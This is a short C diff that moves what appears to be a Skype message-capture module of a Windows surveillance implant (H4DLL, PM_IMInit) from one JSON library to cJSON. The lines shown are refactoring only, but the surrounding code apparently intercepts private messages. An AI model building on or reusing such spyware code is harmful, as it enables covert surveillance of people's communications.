@@ -1,6 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 #include <windows.h>
-#include <json/json.h>
+#include <stdio.h>
+#include <cJSON/cJSON.h>
 #include <time.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/AM_Core.h"
@@ -439,7 +440,7 @@ DWORD WINAPI PM_IMStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_IMInit(JSONObject elem)
+DWORD WINAPI PM_IMInit(cJSON* elem)
 {
 	if (!im_skype_message_list)
 		im_skype_message_list = (im_skype_message_entry *)calloc(SKYPE_MESSAGE_BACKLOG, sizeof(im_skype_message_entry));
